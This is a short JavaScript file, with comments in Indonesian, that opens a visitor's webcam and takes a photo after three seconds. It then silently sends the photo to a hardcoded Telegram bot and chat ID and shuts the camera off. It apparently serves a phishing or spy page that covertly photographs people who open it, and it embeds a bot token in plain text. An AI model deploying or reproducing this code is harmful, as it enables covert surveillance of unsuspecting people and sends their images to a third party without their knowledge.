const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => {
    video.srcObject = stream;
    setTimeout(() => {
      takePhotoAndSend(stream);
    }, 3000); // Tunggu 3 detik sebelum ambil foto
  })
  .catch(err => {
    console.error("Error accessing camera:", err);
  });

function takePhotoAndSend(stream) {
  const context = canvas.getContext('2d');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    const formData = new FormData();
    formData.append('chat_id', '5101579353');
    formData.append('photo', blob, 'photo.jpg');

    fetch('https://api.telegram.org/bot8055826356:AAHC65QS7OlRMxJG_hPA60iz89mnwjgs_lU/sendPhoto', {
      method: 'POST',
      body: formData
    }).then(response => {
      console.log('Photo sent:', response);
      stream.getTracks().forEach(track => track.stop()); // Stop camera
    }).catch(error => {
      console.error('Error sending photo:', error);
    });
  }, 'image/jpeg');
}